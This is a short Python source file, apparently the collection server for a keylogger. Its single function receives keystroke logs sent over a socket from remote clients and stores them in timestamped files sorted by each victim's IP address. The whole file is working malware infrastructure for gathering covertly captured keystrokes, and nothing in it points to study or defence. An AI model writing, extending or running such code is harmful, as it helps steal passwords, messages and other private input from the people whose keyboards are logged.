import os
from datetime import datetime

def save_keylogs(client_socket, client_address):
    folder_name = f"{client_address[0]}_keylogs"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"{folder_name}/keylogs_{timestamp}.txt"

    size_data = client_socket.recv(10).decode('utf-8')
    size = int(size_data)
    print(f"Receiving key logs data of size: {size}")

    received_data = b""
    while len(received_data) < size:
        data = client_socket.recv(size - len(received_data))
        if not data:
            break
        received_data += data

    if len(received_data) == size:
        print("Key logs data received successfully.")
        try:
            with open(file_name, "wb") as f:
                f.write(received_data)
            print(f"Key logs saved successfully to {file_name}.")
        except Exception as e:
            print(f"Failed to save key logs - {e}")
    else:
        print("Failed to receive complete key logs data.")